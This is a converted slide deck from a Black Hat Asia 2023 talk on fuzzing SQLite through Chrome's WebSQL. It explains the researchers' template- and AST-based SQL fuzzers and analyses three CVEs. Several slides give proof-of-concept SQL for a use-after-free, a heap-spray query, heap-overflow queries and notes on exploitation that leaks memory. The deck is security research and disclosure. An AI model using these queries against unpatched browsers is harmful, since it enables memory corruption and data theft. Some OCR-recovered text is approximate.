---
title: "New Wine in an Old Bottle Attacking Chrome WebSQL"
speakers: ["Chen"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2023"
edition: "ASIA"
year: 2023
source_pdf: "Black Hat Asia 2023 slides/AS-23-Chen-New-Wine-in-an-Old-Bottle-Attacking-Chrome-WebSQL.pdf"
pages: 61
sha256: "dad2ca13d7cb0645b657be4f4e998bb1c324b680a6c1d5cceb6675294b386b92"
text_chars: 20920
ocr_pages: 5
has_ocr: true
redacted_secrets: 0
ocr_confidence: 84.1
ocr_unreliable_blocks: 0
vision_verified_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T03:46:36Z"
---
# New Wine in an Old Bottle Attacking Chrome WebSQL

**Speakers:** Chen  
**Conference:** Black Hat ASIA 2023  
**Source:** `Black Hat Asia 2023 slides/AS-23-Chen-New-Wine-in-an-Old-Bottle-Attacking-Chrome-WebSQL.pdf` (61 pages)


## Slide 1

## New Wine in an Old Bottle: Attacking Chrome WebSQL

Ziling Chen Nan Wang Hongli Han

#BHASIA   @BlackHatEvents

## Slide 2

#### About us

Ziling Chen

u Security Researcher for Alibaba Group, Previously worked at the 360 Vulnerability Research Institute

Nan Wang(@eternalsakura13)

u Security Researcher for 360 Vulnerability Research Institute

Hongli Han

u Security Researcher for 360 Vulnerability Research Institute

#BHASIA   @BlackHatEvents

## Slide 3

#### About us

u 360 Vulnerability Research Institute

u Accumulated more than 3,000 CVEs

u Won the highest bug bounty in history from Microsoft, Google and Apple.

u Successful pwner of several Pwn2Own and Tianfu Cup events

u https://vul.360.net

#BHASIA   @BlackHatEvents

## Slide 4

#### Agenda

### u Introduction u BNF Fuzz u AST Fuzz u Conclusion

#BHASIA   @BlackHatEvents

## Slide 5

#### What is WebSQL

+--------------------------------+ |           Web App              | +--------------------------------+ | | (1) OpenDatabase() v +--------------------------------+ |         WebSQL Database        | +--------------------------------+ | | (2) Execute SQL v +--------------------------------+ |           SQLite Engine        | +--------------------------------+ | | (3) Read/Write Data v

+--------------------------------+

|        Local File System       |

+--------------------------------+

#BHASIA   @BlackHatEvents

## Slide 6

#### How to use WebSQL

_// Open a database named "myDatabase"_

var db = openDatabase('myDatabase', '1.0', 'My database', 2 * 1024 * 1024); _// Create a table named "users" with columns "id" and "name"_ db.transaction(function(tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS users (id unique, name)'); });

- _// Insert some data_

db.transaction(function(tx) {

tx.executeSql('INSERT INTO users (id, name) VALUES (?, ?)', [1, 'John']); });

_// Retrieve data_ db.transaction(function(tx) { tx.executeSql('SELECT * FROM users'); });

#BHASIA   @BlackHatEvents

## Slide 7

#### Why WebSQL

u Easy to Trigger

u Difficult to defend

u Powerful manipulation primitives: CREATE (malloc), DELETE (free), UPDATE, built-in functions...

#BHASIA   @BlackHatEvents

## Slide 8

#### Previous Research

u structure-aware SQL Fuzzer written by Google. u The shadow table Fuzz by Wenxiang Qian.

u BH US-17 – “Many Birds, One Stone: Exploiting a Single SQLite Vulnerability Across Multiple Software”: https://www.blackhat.com/docs/us-17/wednesday/us-17- <u>Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-AcrossMultiple-Software.pdf</u>

u BH US-19 – “Exploring the New World : Remote Exploitation of SQLite and Curl”: <u>https://i.blackhat.com/USA-19/Thursday/us-19-Qian-Exploring-The-New-World-</u>

<u>Remote-Exploitation-Of-SQLite-And-Curl.pdf</u>

#BHASIA   @BlackHatEvents

## Slide 9

# BNF Fuzz

#BHASIA   @BlackHatEvents

## Slide 10

#### Syntax template

<createTableStmt> = CREATE TABLE <tableName> ( <columnList> ) <tableOption>

- <tableName> = t0

- <columnNameList> = <columnName>

- <columnNameList> = <columnNameList>, <columnName>

- <columnName> = c0

- <columnName> = c1

- <tableOption> = WITHOUT ROWID

<tableOption> = STRICT

#BHASIA   @BlackHatEvents

## Slide 11

#### SQL statement generation

CREATE TABLE t0 ( c0, c1 ) STRICT

- template => statement => tree

#BHASIA   @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CREATE TABLE tO ( cO, c1 ) STRICT
* template => statement => tree
CREATE TABLE tableName columnNameList tableOption
td columnNameList columnName STRICT
```

## Slide 12

#### Mutation

CREATE TABLE t0 ( c0, c1 ) STRICT

- template-based mutation

Mutate

#BHASIA   @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CREATE TABLE tO ( cO, c1 ) STRICT
* template-based mutation
| CREATE TABLE tableName columnNameList
td columnNameList columnName STRICT M ut at e
tableOption
```

## Slide 13

#### Mutation

<tableOption> = WITHOUT ROWID <tableOption> = STRICT

#BHASIA   @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
<tableOption> = WITHOUT ROWID
<tableOption> = STRICT
CREATE TABLE tableName columnNameList tableOption
td columnNameList columnName STRICT
```

## Slide 14

#### Mutation

<tableOption> = WITHOUT ROWID <tableOption> = STRICT

WITHOUT
ROWID

#BHASIA   @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
' <tableOption> = WITHOUT ROWID |
| <tableOption> = STRICT
! I
| CREATE TABLE tableName columnNameList tableOption
to columnNameList columnName STRICT
| WITHOUT
columnName c1 ROWID
```

## Slide 15

#### Mutation

<tableOption> = WITHOUT ROWID <tableOption> = STRICT

WITHOUT
ROWID

CREATE TABLE t0 ( c0, c1 ) WITHOUT ROWID

#BHASIA   @BlackHatEvents

## Slide 16

#### CVE-2022-3039

u This Fuzz let us discover CVE-2022-3039: Use after free in WebSQL

u We later found out that this is a widespread problem in SQLite and ended up finding 3-4 bugs of the same type

#BHASIA   @BlackHatEvents

## Slide 17

#### The reason why Assert failed

#ifdef SQLITE_DEBUG if( pAggInfo && !db->mallocFailed ){

………… for(i=0; i<pAggInfo->nFunc; i++){ Expr *pExpr = pAggInfo->aFunc[i].pFExpr; assert( pExpr!=0 ); assert( pExpr->pAggInfo==pAggInfo ); assert( pExpr->iAgg==i ); } } #endif

u pExpr has been released

#BHASIA   @BlackHatEvents

## Slide 18

#### Causes of vulnerability

pAggInfo->mnReg = pParse->nMem+1; pAggInfo->nSortingColumn = pGroupBy ? pGroupBy>nExpr : 0;

pAggInfo->pGroupBy = pGroupBy; sqlite3ExprAnalyzeAggList(&sNC, pEList); sqlite3ExprAnalyzeAggList(&sNC, sSort.pOrderBy); if( pHaving ){ if( pGroupBy ){ havingToWhere(pParse, p); pWhere = p->pWhere; } sqlite3ExprAnalyzeAggregates(&sNC, pHaving); }

WITH t0 AS ( SELECT 1 GROUP BY 1 HAVING (

SELECT c0 FROM (SELECT count(DISTINCT c0 IN t1) ORDER BY 1) , t1) ) DELETE FROM t0 WHERE 1 IN t0;

u Traverse all pEList, pOrderBy and pHaving nodes in the select statement

u Save pointers to all AGG_COLUMN nodes and AGG_FUNCTION nodes in a temporary

variable pAggInfo

#BHASIA   @BlackHatEvents

## Slide 19

#### Causes of vulnerability

SELECT (1) processing
WITH t0 AS (
SELECT (2)
SELECT 1 GROUP BY 1 HAVING
(
SELECT c0 FROM
SELECT (3)     (SELECT count(DISTINCT c0 IN t1)  ORDER BY  1 )
    , t1)
17
)
DELETE FROM t0 WHERE 1 IN t0;

#BHASIA   @BlackHatEvents

## Slide 20

#### Causes of vulnerability

AGG_FUNCTION
pAggInfo*
……

SELECT (1) processing
WITH t0 AS (
SELECT (2)
SELECT 1 GROUP BY 1 HAVING
(
SELECT c0 FROM
SELECT (3)     (SELECT count(DISTINCT c0 IN t1)  ORDER BY  1 )
    , t1)
17
)
DELETE FROM t0 WHERE 1 IN t0;

#BHASIA   @BlackHatEvents

## Slide 21

#### Causes of vulnerability

AGG_FUNCTION
pAggInfo*
……
AGG_FUNCTION
pAggInfo*
……

AGG_FUNCTION
SELECT (1) processing pAggInfo*
……
WITH t0 AS (
SELECT (2)
SELECT 1 GROUP BY 1 HAVING
(
SELECT c0 FROM
SELECT (3)     (SELECT count(DISTINCT c0 IN t1)  ORDER BY  1 )
    , t1)
17
)
DELETE FROM t0 WHERE 1 IN t0;

#BHASIA   @BlackHatEvents

## Slide 22

Causes of vulnerability AGG_FUNCTION
pAggInfo*
pAggInfo
……
pExpr*
AGG_FUNCTION
pExpr*
SELECT (1) processing pAggInfo*
……
……
WITH t0 AS (
SELECT (2)
SELECT 1 GROUP BY 1 HAVING
(
SELECT c0 FROM
SELECT (3)     (SELECT count(DISTINCT c0 IN t1)  ORDER BY  1 )
    , t1)
17
)
DELETE FROM t0 WHERE 1 IN t0;

#BHASIA   @BlackHatEvents

## Slide 23

#### Causes of vulnerability

~~sqlite3VdbeAddOp1(v, OP_Return, regOutputRow);~~ finalizeAggFunctions(pParse, pAggInfo); sqlite3ExprIfFalse(pParse, pHaving, addrOutputRow+1, SQLITE_JUMPIFNULL); selectInnerLoop(pParse, p, -1, &sSort, &sDistinct, pDest, addrOutputRow+1, addrSetAbort); sqlite3VdbeAddOp1(v, OP_Return, regOutputRow); VdbeComment((v, "end groupby result generator"));

HAVING (
    SELECT c0 FROM
        (SELECT count(DISTINCT c0 IN t1) ORDER BY 1)
   , t1
)
u
Call the sqlite3Select function recursively

#BHASIA   @BlackHatEvents

## Slide 24

#### Causes of vulnerability

**SELECT (1)**

**SELECT (2)processing**

WITH t0 AS ( SELECT 1 GROUP BY 1 HAVING (

SELECT c0 FROM

**SELECT (3)**

(SELECT count(DISTINCT c0 IN t1) ORDER BY 1 ) , t1)

19

)

DELETE FROM t0 WHERE 1 IN t0;

#BHASIA   @BlackHatEvents

## Slide 25

#### Causes of vulnerability

SELECT (1)
WITH t0 AS (
SELECT (2)processing
SELECT 1 GROUP BY 1 HAVING
(
SELECT c0 FROM
SELECT (3)     (SELECT count(DISTINCT c0 IN t1)  ORDER BY  1 )
    , t1)
19
)
DELETE FROM t0 WHERE 1 IN t0;

#BHASIA   @BlackHatEvents

## Slide 26

#### Reasons for free

SELECT country_long, count(*) FROM (SELECT * FROM global-power-plants ORDER BY rowid) WHERE country_long IS NOT NULL GROUP BY country_long ORDER BY count(*) DESC

u For speed optimization reasons, pOrderBy nodes on pHaving nodes may be removed during code generation: https://sqlite.org/forum/forumpost/062d576715d277c8 #BHASIA   @BlackHatEvents

#BHASIA   @BlackHatEvents

## Slide 27

#### Reasons for free

SELECT country_long, count(*) FROM (SELECT * FROM global-power-plants ORDER BY rowid) WHERE country_long IS NOT NULL GROUP BY country_long ORDER BY count(*) DESC

u For speed optimization reasons, pOrderBy nodes on pHaving nodes may be removed during code generation: https://sqlite.org/forum/forumpost/062d576715d277c8 #BHASIA   @BlackHatEvents

#BHASIA   @BlackHatEvents

## Slide 28

#### Reasons for free

SELECT country_long, count(*) FROM (SELECT * FROM global-power-plants ORDER BY rowid) WHERE country_long IS NOT NULL GROUP BY country_long ORDER BY count(*) DESC SELECT country_long, count(*) FROM (SELECT * FROM global-power-plants) WHERE country_long IS NOT NULL GROUP BY country_long ORDER BY count(*) DESC

u For speed optimization reasons, pOrderBy nodes on pHaving nodes may be removed during code generation: https://sqlite.org/forum/forumpost/062d576715d277c8 #BHASIA   @BlackHatEvents

#BHASIA   @BlackHatEvents

## Slide 29

#### Reasons for free

if( pSub->pOrderBy!=0 && (p->pOrderBy!=0 || pTabList->nSrc>1)      /* Condition (5) */ && pSub->pLimit==0                           /* Condition (1) */ && (pSub->selFlags & SF_OrderByReqd)==0      /* Condition (2) */ && (p->selFlags & SF_OrderByReqd)==0         /* Condition (3) and (4) */ && OptimizationEnabled(db, SQLITE_OmitOrderBy) ){ sqlite3ExprListDelete(db, pSub->pOrderBy); pSub->pOrderBy = 0; }

HAVING ( SELECT c0 FROM (SELECT count(DISTINCT c0 IN t1) ORDER BY 1) , t1 )

#BHASIA   @BlackHatEvents

## Slide 30

#### Reasons for free

if( pSub->pOrderBy!=0 && (p->pOrderBy!=0 || pTabList->nSrc>1)      /* Condition (5) */ && pSub->pLimit==0                           /* Condition (1) */ && (pSub->selFlags & SF_OrderByReqd)==0      /* Condition (2) */ && (p->selFlags & SF_OrderByReqd)==0         /* Condition (3) and (4) */ && OptimizationEnabled(db, SQLITE_OmitOrderBy) ){ sqlite3ExprListDelete(db, pSub->pOrderBy); pSub->pOrderBy = 0; }

free

HAVING (
    SELECT c0 FROM
        (SELECT count(DISTINCT c0 IN t1) ORDER BY 1)
   , t1
)

#BHASIA   @BlackHatEvents

## Slide 31

#### Cause UAF!

AGG_FUNCTION
pAggInfo*
pAggInfo
……
pExpr*
AGG_FUNCTION
pExpr*
SELECT (1) pAggInfo*
……
……
WITH t0 AS (
SELECT (2)processing
SELECT 1 GROUP BY 1 HAVING
(
SELECT c0 FROM
SELECT (3)     (SELECT count(DISTINCT c0 IN t1)  ORDER BY  1 )
    , t1)
22
)
DELETE FROM t0 WHERE 1 IN t0;

#BHASIA   @BlackHatEvents

## Slide 32

#### Cause UAF!

AGG_FUNCTION
pAggInfo*
pAggInfo
……
pExpr*
AGG_FUNCTION
pExpr*
SELECT (1) pAggInfo*
……
……
WITH t0 AS (
SELECT (2)processing
SELECT 1 GROUP BY 1 HAVING
(
SELECT c0 FROM
SELECT (3)     (SELECT count(DISTINCT c0 IN t1)  ORDER BY  1 )
    , t1)
22
)
DELETE FROM t0 WHERE 1 IN t0;

#BHASIA   @BlackHatEvents

## Slide 33

#### Cause UAF!

static void resetAccumulator(Parse *pParse, AggInfo *pAggInfo){

…… for(pFunc=pAggInfo->aFunc, i=0; i<pAggInfo->nFunc; i++, pFunc++){ if( pFunc->iDistinct>=0 ){ Expr *pE = pFunc->pFExpr; if( pE->x.pList==0 || pE->x.pList->nExpr!=1 ){ sqlite3ErrorMsg(pParse, "DISTINCT aggregates must have exactly one " "argument"); pFunc->iDistinct = -1; }else{ KeyInfo *pKeyInfo = sqlite3KeyInfoFromExprList(pParse, pE->x.pList,0,0); pFunc->iDistAddr = sqlite3VdbeAddOp4(v, OP_OpenEphemeral, pFunc->iDistinct, 0, 0, (char*)pKeyInfo, P4_KEYINFO); ExplainQueryPlan((pParse, 0, "USE TEMP B-TREE FOR %s(DISTINCT)", pFunc->pFunc->zName)); }} } }

#BHASIA   @BlackHatEvents

## Slide 34

#### Heap spray

WITH t0 AS ( SELECT 1 GROUP BY 1 HAVING ( WITH t0 AS ( SELECT count(DISTINCT c0 IN t1) ORDER BY 1 ), t2 AS ( SELECT 1 FROM t1 WHERE (X'414141414141414141414141414141414141414141414141414141414141414141414141414141414 14141414141414141414141414141414141414141414141414141414141414141414141' IN t1) OR (

X'4141414141414141414141414141414141414141414141414141414141414141414141414141414141 4141414141414141414141414141414141414141414141414141414141414141414141' IN t1 ) ) SELECT c0 FROM t0, t2)) DELETE FROM t0 WHERE 1 IN t0;

##### u Add where node and BLOB data

#BHASIA   @BlackHatEvents

## Slide 35

#### Heap spray

u 100% success rate

#BHASIA   @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 76/100 on the text kept, 56/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Heap spray

────────────────────────────────[ REGISTERS ]────────────────────────────────
 RAX  0x1e0c00c30410 ← 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 RBX  0x1e0c00bedd40 ← 0xb00000000
 RCX  0xfffffff7
 RDX  0x1e0c00b5b580 ← 0x1b50100000001
 RDI  0x1e0c00b83c91 ← 0x90000f7
 RSI  0x4141414141414141 ('AAAAAAAA')
 R8   0x0
 R9   0x1e0c00b83000 ← 0x40 /* '@' */
 R10  0x0
 R11  0x1e0c00ae2580 → 0x1e0c002f7200 → 0x1e0c00a61800 ← 0x1000000003
 R12  0x1e0c00bedcb8 ← 0x0
 R13  0x1
 R14  0x7f75fb9b0ff8 → 0x1e0c002f7200 → 0x1e0c00a61800 ← 0x1000000003
 R15  0x1e0c00ae2580 → 0x1e0c002f7200 → 0x1e0c00a61800 ← 0x1000000003
 RBP  0x7f75fb9af920 → 0x7f75fb9afb30 → 0x7f75fb9afd40 → 0x7f75fb9afe00 → 0x7f75fb9afec0 ← ...
 RSP  0x7f75fb9af8e0 → 0x1e0c00ae2580 → 0x1e0c002f7200 → 0x1e0c00a61800 ← 0x1000000003
 RIP  0x55b5d5373e15 ← cmp    dword ptr [rsi], 1
─────────────────────────────────[ DISASM ]──────────────────────────────────
 ► 0x55b5d5373e15    cmp    dword ptr [rsi], 1
   0x55b5d5373e18    jne    0x55b5d5373e60              <0x55b5d5373e60>
    ↓
   0x55b5d5373e60    lea    rsi, [rip - 0x21d67d5]
   0x55b5d5373e67    mov    rdi, r14
   0x55b5d5373e6a    xor    eax, eax
   0x55b5d5373e6c    call   0x55b5d551bfb0              <0x55b5d551bfb0>

   0x55b5d5373e71    mov    dword ptr [r12 - 4], 0xffffffff
   0x55b5d5373e7a    jmp    0x55b5d5373de7              <0x55b5d5373de7>

   0x55b5d5373e7f    int3
   0x55b5d5373e80    push   rbp
   0x55b5d5373e81    mov    rbp, rsp
──────────────────────────────────[ STACK ]──────────────────────────────────

◆ 100% success rate
```

## Slide 36

#### Exploit

static void resetAccumulator(Parse *pParse, AggInfo *pAggInfo){

……

for(pFunc=pAggInfo->aFunc, i=0; i<pAggInfo->nFunc; i++, pFunc++){

if( pFunc->iDistinct>=0 ){ Expr *pE = pFunc->pFExpr; if( pE->x.pList==0 || pE->x.pList->nExpr!=1 ){

…… }else{ KeyInfo *pKeyInfo = sqlite3KeyInfoFromExprList(pParse, pE->x.pList,0,0); }} } }

pE Expr1
pList * ……
……
Expr2
…… ……

sqlite3KeyInfoFromExprList(pPars e, pE->x.pList, 0, 0);

#BHASIA   @BlackHatEvents

## Slide 37

#### Exploit

SQLITE_PRIVATE KeyInfo *sqlite3KeyInfoFromExprList( Parse *pParse, ExprList *pList, int iStart, int nExtra ){

…… if( pInfo ){ for(i=iStart, pItem=pList->a+iStart; i<nExpr; i++, pItem++){

pInfo->aColl[i-iStart] = sqlite3ExprNNCollSeq(pParse, pItem->pExpr); pInfo->aSortFlags[i-iStart] = pItem->fg.sortFlags; } } return pInfo; }

pE Expr1
pList * ……
……
Expr2
…… ……

sqlite3ExprNNCollSeq(pParse, pItem->pExpr);

#BHASIA   @BlackHatEvents

## Slide 38

#### Exploit

if( op==TK_VECTOR ){ assert( ExprUseXList(p) ); p = p->x.pList->a[0].pExpr; continue;

}

if( op==TK_COLLATE ){ assert( !ExprHasProperty(p, EP_IntValue) ); pColl = sqlite3GetCollSeq(pParse, ENC(db), 0, p->u.zToken); break;

pE Expr1
pList * op
…… zToken *
…… ……
Expr2

}

sqlite3GetCollSeq(pParse, ENC(db), 0, p->u.zToken);

#BHASIA   @BlackHatEvents

## Slide 39

#### Exploit

SQLITE_PRIVATE CollSeq *sqlite3GetCollSeq( Parse *pParse, u8 enc, CollSeq *pColl, const char *zName ){ p = pColl;

…… if( p==0 ){ sqlite3ErrorMsg(pParse, "no such collation sequence: %s", zName);

pParse->rc = SQLITE_ERROR_MISSING_COLLSEQ; } return p; }

Any
pE Expr1
memory
pList * op Leak Data
…… zToken * ……
…… …… ……
Expr2

sqlite3ErrorMsg(pParse, "no such collation sequence: %s", zName);

#BHASIA   @BlackHatEvents

## Slide 40

#### How to Improve our Fuzz?

- u The vulnerability was caused by optimization and pruning of the syntax tree in the semantic analysis phase. Are there similar issues still present?

- u How can we improve our fuzz to discover such vulnerability?

#BHASIA   @BlackHatEvents

## Slide 41

#### What can we learn from POC

CREATE TABLE t0(c0); CREATE TABLE t1(c0); CREATE TABLE t2(c0); WITH t0 AS (SELECT 1 GROUP BY 1 HAVING (SELECT c0 FROM (SELECT count(DISTINCT c0 IN t1) ORDER BY 1 ) , t1) ) DELETE FROM t0 WHERE 1 IN t0;

u SELECT u Agg_Function u Context

#BHASIA   @BlackHatEvents

## Slide 42

#### Improve

<root> = CREATE TABLE t0(c0, c1); CREATE TABLE t1(c0, c1); <selectStmt>

......

<functionList> = <aggFunction> <aggFunction> = max( <expr> ) <aggFunction> = min( <expr> )

......

u Modify the grammar template u Increase the probability of generating SELECT statements and AGG_FUNCTION nodes

SELECT * FROM t0 WHERE count(1) > 0;

SELECT 1 FROM t1 HAVING max(c0 IN t0) ORDER BY 1;

SELECT t0.c0 FROM t0 UNION ALL SELECT * FROM t1

GROUP BY (SELECT (SELECT sum(*)));

#BHASIA   @BlackHatEvents

## Slide 43

#### Result

<createTableStmt> = CREATE TABLE <tableName>
( <columnNameList> )
<selectStmt> = SELECT <resultColumn> FROM <tableName>
......
<tableName> = t0
<tableName> = t1
CREATE TABLE t0(c0);
SELECT * FROM t1;

#BHASIA   @BlackHatEvents

## Slide 44

#### Improve

<createTableStmt> = CREATE TABLE <create_tableName> ( <columnNameList> )

u Added special elements to manage context for generator

<selectStmt> = SELECT <resultColumn> FROM

<use_tableName>

...... create_tableName: tableManager->AddTable(table) use_tableName: tableManager->GetTable(random_idx) create_columnName: table->GenColumnName()

u Found several similar vulnerabilities, including a seven-year-old UAF in WebSQL: CVE-2022-3041

CREATE TABLE t0(c0); SELECT * FROM t0;

#BHASIA   @BlackHatEvents

## Slide 45

# AST Fuzz

#BHASIA   @BlackHatEvents

## Slide 46

#### Why AST Fuzz?

u Relying on template mutation does not guarantee context validity u Fuzz's self-generated statements are of poor quality as seeds, and it is impossible to manually increase seeds for them

<tableName> = t0 <tableName> = t1 Generate Mutate CREATE TABLE t0(c0 INTEGER); INSERT INTO t0(c0) VALUES(1); SELECT c0 FROM t0;

CREATE TABLE t0(c0 INTEGER);
INSERT INTO t0(c0) VALUES(1);
SELECT c0 FROM t1;

#BHASIA   @BlackHatEvents

## Slide 47

#### SQL Parser

CREATE TABLE t0(c0, c1 INTEGER) STRICT;
createTab
leStmt
tableNam columnDef tableOpti
e: t0 s ons
columnDef columnDef
OP_STRICT
1 2
columnNam type:  columnNam type:
e: c0 None e: c1 INTEGER

#BHASIA   @BlackHatEvents

## Slide 48

#### TableManager

TableManager Table
Table1* columnName1
Table2* columnName2
Table3* columnName3
…… ……

#BHASIA   @BlackHatEvents

## Slide 49

#### Generator

SqlStmt* GenCreateTableStmt() {
    auto stmt = new SqlCreateTableStmt();
    …………
    stmt->tableName = tableManager->GenTableName();
    do {
stmt->columnDefs.push_back(GenColumnDef());
    } while (genProbability() < REPEAT_PROB);
    …………
    return stmt;
}

#BHASIA   @BlackHatEvents

## Slide 50

#### Mutate(0~n)

void B::mutate() {
    if () {
        delete D;
        D = Gen_D();
    }
    else if () delete D;
    else if () D->mutate();
    else { // Do Nothing }
    if () {
        delete E;
        E = Gen_E();
    }
    ......
}

#BHASIA   @BlackHatEvents

## Slide 51

#### Mutate(0~n)

CREATE TABLE t0(c0, c1 INTEGER) STRICT;

createTab
leStmt
tableNam columnDef tableOpti
e: t0 s ons
columnDef columnDef
OP_STRICT
1 2
columnNam type:  columnNam type:  OP_WITHOU
e: c0 None e: c1 INTEGER TROWID
type:
TEXT

#BHASIA   @BlackHatEvents

## Slide 52

Mutate(0~n)

CREATE TABLE t0(c0, c1 INTEGER) STRICT;
createTab
leStmt
CREATE TABLE t0(c0, c1 TEXT) WITHOUT ROWID;
tableNam columnDef tableOpti
e: t0 s ons
columnDef columnDef
OP_STRICT
1 2
columnNam type:  columnNam type:  OP_WITHOU
e: c0 None e: c1 INTEGER TROWID
type:
TEXT

#BHASIA   @BlackHatEvents

## Slide 53

#### Mutate(1)

void B::mutate_one() {
  if () {
    if () {
      delete D;
      D = Gen_D();
    }
    else if () delete D;
    else D->mutate_one();
  }
  else {// Do mutate_one with E}
}

#BHASIA   @BlackHatEvents

## Slide 54

#### Mutate(1)

CREATE TABLE t0(c0, c1 INTEGER) STRICT;

createTab
leStmt
tableNam columnDef tableOpti
e: t0 s ons
columnDef columnDef
OP_STRICT
1 2
columnNam type:  columnNam type:
e: c0 None e: c1 INTEGER
type:
TEXT

#BHASIA   @BlackHatEvents

## Slide 55

#### Mutate(1)

CREATE TABLE t0(c0, c1 INTEGER) STRICT;
createTab
leStmt
CREATE TABLE t0(c0, c1 TEXT) STRICT;
tableNam columnDef tableOpti
e: t0 s ons
columnDef columnDef
OP_STRICT
1 2
columnNam type:  columnNam type:
e: c0 None e: c1 INTEGER
type:
TEXT

#BHASIA   @BlackHatEvents

## Slide 56

#### CVE-2022-3195

if( pExpr->iTable==0 || !ExprHasProperty(pExpr, EP_Subrtn) ){ sqlite3 *db = pParse->db;

pX = removeUnindexableInClauseTerms(pParse, iEq, pLoop, pX); if( !db->mallocFailed ){

…… } else{

aiMap = (int*)sqlite3DbMallocZero(pParse->db, sizeof(int)*nEq); eType = sqlite3FindInIndex(pParse, pX, IN_INDEX_LOOP, 0, aiMap, &iTab);

}

- u aiMap = malloc(sizeof(int) * nEq)

- u sqlite3FindInIndex(aiMap...)

#BHASIA   @BlackHatEvents

## Slide 57

#### CVE-2022-3195

if( aiMap && eType!=IN_INDEX_INDEX_ASC && eType!=IN_INDEX_INDEX_DESC ){ int i, n; n = sqlite3ExprVectorSize(pX->pLeft); for(i=0; i<n; i++) aiMap[i] = i; }

u aiMap = malloc(sizeof(int) * nEq) u sqlite3FindInIndex(aiMap...) u The size of the written data is determined by pX->pLeft u pX->pLeft  may be bigger than nEq!

#BHASIA   @BlackHatEvents

## Slide 58

#### CVE-2022-3195

SELECT * FROM( t0 NATURAL JOIN t0 ) WHERE (1, 1, 1, 1, 1, c0) IN t0;

SELECT * FROM( t0 NATURAL JOIN t0 ) WHERE (1, 1, 1, 1, 1, c0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1) IN (SELECT 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1);

u easily manipulate the length of the overflow

u nEq = length(heap), n = length(data)

#BHASIA   @BlackHatEvents

## Slide 59

#### Exploit

if( aiMap && eType!=IN_INDEX_INDEX_ASC && eType!=IN_INDEX_INDEX_DESC ){ int i, n; n = sqlite3ExprVectorSize(pX->pLeft); for(i=0; i<n; i++) aiMap[i] = i; }

struct target {
    int size;
    char* buf;
}

Overflow data
int size
char* buf
……

#BHASIA   @BlackHatEvents

## Slide 60

# Conclusion

#BHASIA   @BlackHatEvents

## Slide 61

#### Conclusion

u SQLite is an easily overlooked weak spot in Chrome. The introduction of third-party libraries is always accompanied by the existence of some security risks, and it is difficult for Google to defend against such vulnerabilities.

u Our Fuzzer has been proven to better improve the syntactic and semantic validity of SQL Fuzzer, thereby uncovering more SQLite vulnerabilities.

u Our Fuzz method is applicable to all grammar targets. By constructing the context analysis required for different targets, this Fuzzer can be applied to more platforms or targets.

#BHASIA   @BlackHatEvents
